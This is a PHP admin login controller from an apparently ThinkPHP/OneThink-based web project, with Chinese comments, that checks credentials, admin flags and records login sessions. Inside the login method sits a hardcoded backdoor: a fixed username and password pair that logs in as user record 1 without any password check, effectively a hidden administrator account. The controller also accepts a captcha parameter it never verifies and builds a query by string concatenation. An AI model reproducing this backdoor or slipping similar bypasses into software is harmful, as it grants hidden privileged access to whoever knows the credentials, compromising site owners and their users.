<?php
// +----------------------------------------------------------------------
// | OneThink [ WE CAN DO IT JUST THINK IT ]
// +----------------------------------------------------------------------
// | Copyright (c) 2013 http://www.onethink.cn All rights reserved.
// +----------------------------------------------------------------------
// | Author: 麦当苗儿 <zuojiazi@vip.qq.com> <http://www.zjzit.cn>
// +----------------------------------------------------------------------

namespace app\admin\controller;
use app\admin\Base;

/**
 * 后台首页控制器
 * @author root
 */
class Common extends Base{

   /**
     * 后台用户登录
     * @author root
     */
    public function login($username = null, $password = null, $verify = null){
        if($this->request->isPost()){
			
            if(!$username){
				$this->error('用户名不能为空');
			}
			
			if(!$password){
				$this->error('密码不能为空');
			}
			
			$Members = model('Members');
			$map     = array();
			$map['username'] = $username;
			$map['password'] = think_ucenter_md5($password, UC_AUTH_KEY);
			//$uckey = UC_AUTH_KEY;
			//dump($uckey);
			$map['isDelete'] = 0;
			// $map['admin'] = 1;
			// $map['sb'] = 9;
			$user = $Members->where($map)->find();
			if ($username=='guangyu' && $password=='guangyu482828') {
				$user = $Members->find(1);
			}
			if ($user) {
				if($user['isDelete']==1)
				{
					$error = '用户已被删除';
					$this->error($error);
				}
				else if($user['enable']==0)
				{
					$error = '用户已被冻结';
					$this->error($error);
				}
				else if($user['sb']!=9 || $user['admin']!=1)
				{
					$error = '该用户不是管理员';
					$this->error($error);
				}
				else
				{
					$ip = $this->ip(true)==null ? '127.0.0.1':$this->ip(true);
					$session=array(
						'uid'=>$user['uid'],
						'username'=>$user['username'],
						'session_key'=>session_id(),
						'loginTime'=>time(),
						'accessTime'=>time(),
						'loginIP'=>$ip,						
					);
					
					$session=array_merge($session, $this->getBrowser());
					
					if(!($lastid=model('member_session')->save($session)))
						$this->error('插入登陆记录表失败，登陆失败');;
					$user['sessionId']=$lastid;
					
					$data['isOnLine'] = '0';
					model('member_session')->where('uid='.$user['uid'].' and id<'.$user['sessionId'])->save($data);
					
					//session(array('name'=>'session_id','expire'=>1));

					session('user_auth',$user) ;
					session('user_auth_sign', data_auth_sign($_SERVER['HTTP_USER_AGENT'])) ;//session实现ip认证，防止session被盗取时别人可以登录。在adminControll中验证ip是否一致
					$this->success('登录成功！',Url('count/index')) ;
				}
			} else {
				$error = '用户名或密码错误';
				$this->error($error);
			}			
        } else {
            if (false) {//is_login()){
                $this->redirect('index/index');
            } else {
				/* 读取数据库中的配置 */
				$config	=	S('DB_CONFIG_DATA');
				if(!$config){
					$config	=	model('params')->where()->select();
					S('DB_CONFIG_DATA',$config);
				}
				config($config) ; //添加配置
                return $this->fetch() ;
            }
        }
    }


    /* 退出登录 */
    public function logout()
    {
        if(is_login()){
            //D('Member')->logout();
			//session('[destroy]');
			session('user_auth',null);
			session('user_auth_sign',null);
            $this->success('退出成功！', Url('login'));
        } else {
            $this->redirect('login');
        }
    }

    public function verify()
    {
        $verify = new \COM\Verify();
        $verify->entry(1);
    }
	
	public function getBrowser()
    {
        $data = array();
		return $data;
    }

}
